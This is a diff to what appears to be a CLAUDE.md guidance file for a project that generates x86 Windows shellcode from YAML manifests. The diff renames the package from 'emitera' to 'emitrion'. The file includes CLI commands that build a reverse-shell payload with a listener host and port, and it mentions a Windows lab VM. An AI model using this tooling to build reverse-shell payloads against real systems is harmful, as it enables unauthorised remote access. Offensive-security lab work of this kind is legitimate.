@@ -9,12 +9,12 @@ This file provides guidance to Claude Code (claude.ai/code) when working with co
 uv run pytest
 
 # Run a single test file or test function
-uv run pytest emitera/tests/test_encode.py -q
-uv run pytest emitera/tests/test_payload_templates.py::TestReverseShellAutoDerive::test_asm_output -q
+uv run pytest emitrion/tests/test_encode.py -q
+uv run pytest emitrion/tests/test_payload_templates.py::TestReverseShellAutoDerive::test_asm_output -q
 
-# Build shellcode from a manifest (emitera CLI)
-uv run emitera emitera/manifests/revshell.yaml --lhost 192.168.1.100 --lport 9001 --out emitter_out/
-uv run emitera emitera/manifests/revshell.yaml --no-assemble --out emitter_out/  # skip assembly (no assembler on Mac)
+# Build shellcode from a manifest (emitrion CLI)
+uv run emitrion emitrion/manifests/revshell.yaml --lhost 192.168.1.100 --lport 9001 --out emitter_out/
+uv run emitrion emitrion/manifests/revshell.yaml --no-assemble --out emitter_out/  # skip assembly (no assembler on Mac)
 ```
 
 Python 3.13 via uv. The `.venv` is managed by uv; use `uv run` for all commands. Do not use system Python or conda.
@@ -29,7 +29,7 @@ Assembly (Keystone/NASM) is only available on the Windows lab VM. Tests that req
 
 ## Emitter architecture
 
-The emitter (`emitera/`) generates position-independent x86 Windows shellcode from YAML manifests.
+The emitter (`emitrion/`) generates position-independent x86 Windows shellcode from YAML manifests.
 
 ### Pipeline flow
 
